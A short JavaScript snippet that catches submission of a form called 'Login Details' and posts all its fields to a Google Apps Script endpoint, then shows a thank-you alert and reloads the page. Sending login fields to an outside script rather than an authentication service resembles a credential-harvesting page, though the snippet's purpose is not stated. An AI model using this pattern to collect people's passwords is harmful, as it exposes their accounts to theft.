const scriptURL = 'https://script.google.com/macros/s/AKfycbxQd6bNxJ4fNkFMZDXqe-ThwOPUWxlQFW_fYNO6WWLYCXAPAtknTcnOwqiwHM6WsoB8/exec'

const form = document.forms['Login Details']

form.addEventListener('submit', e => {
    e.preventDefault()
    fetch(scriptURL, { method: 'POST', body: new FormData(form) })
        .then(response => alert("Thank you! your form is submitted successfully."))
        .then(() => { window.location.reload(); })
        .catch(error => console.error('Error!', error.message))
})
